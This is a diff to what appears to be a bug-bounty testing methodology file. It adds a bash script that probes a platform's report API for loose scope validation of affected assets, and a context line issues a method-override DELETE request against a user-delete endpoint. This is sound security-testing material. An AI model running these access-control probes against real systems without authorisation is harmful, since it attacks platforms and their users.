@@ -175,7 +175,7 @@ WEAK SIGNAL → DEEPER TEST MAP:
 
 ---
 
-## Phase 12: Broken Access Control — CIA: C:H I:H
+## Phase 12: Broken Access Control - CIA: C:H I:H
 
 ### SUB-PHASE 12.2: HUNT
 
@@ -215,6 +215,42 @@ done
 curl -sk -X POST "$TARGET/api/user/delete" \
      -H "X-HTTP-Method-Override: DELETE" \
      -H "Authorization: Bearer $USER1_TOKEN" -w " HTTP:%{http_code}"
+```
+
+**Out-of-scope asset validation bypass (platform report submission):**
+**Source:** [[scope-validation-bypass]] - loose asset scope-match validation (validated LOW on live platform)
+```
+ORDER: fetch program's declared affected_assets -> control-1 in-scope accepted ->
+  control-2 foreign domain rejected -> control-3 undeclared family subdomain accepted?
+  -> if control-3 accepted while control-2 rejected: loose domain-match = CWE-284.
+```
+```bash
+#!/bin/bash
+# PHASE 12.2 - Program scope validation bypass test.
+# CWE-284: an affected_asset list must be validated by EXACT-MATCH against the
+# program's declared scope. A loose domain-suffix regex accepts any sibling
+# subdomain the program never declared.
+
+API="$1"              # report endpoint, e.g. https://platform-api.target.com/api/v1/pentesters/programs/report
+JWT="$2"              # authenticated hunter session (joined the program)
+PROGRAM_UUID="$3"
+IN_SCOPE="https://platform.target.com"   # control-1 baseline (must be accepted)
+FOREIGN="https://evil.com"               # control-2 (must be rejected)
+UNDECLARED="https://blog.target.com"     # control-3 family subdomain NOT in declared list
+
+test_asset() {
+  curl -s -X POST "$API" -H "Authorization: Bearer $JWT" \
+    -H "Origin: https://platform.target.com" \
+    -F "program_uuid=$PROGRAM_UUID" \
+    -F "affected_asset=[\"$1\"]" \
+    -F "title=Scope control test" \
+    -F "save_as_draft=true"
+}
+
+echo "[control-1] in-scope:   $(test_asset "$IN_SCOPE")"
+echo "[control-2] foreign:    $(test_asset "$FOREIGN")"
+echo "[control-3] undeclared: $(test_asset "$UNDECLARED")"
+# BUG: control-3 returns success:true while control-2 returns "Invalid asset url!"
 ```
 
 ### CHAIN OUTPUT:
